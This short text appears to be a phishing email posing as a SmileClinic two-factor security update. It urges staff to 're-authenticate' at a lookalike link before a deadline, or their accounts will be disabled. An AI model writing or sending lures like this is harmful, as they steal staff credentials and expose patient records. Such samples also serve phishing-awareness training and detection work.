Security Update Required

SmileClinic is implementing enhanced two-factor authentication for all accounts.

You must re-authenticate your account to continue accessing clinical systems and patient records.

Re-authenticate here: https://2fa-setup-smileclinic.com/auth

Accounts that are not re-authenticated by December 5 will be automatically disabled for security purposes.
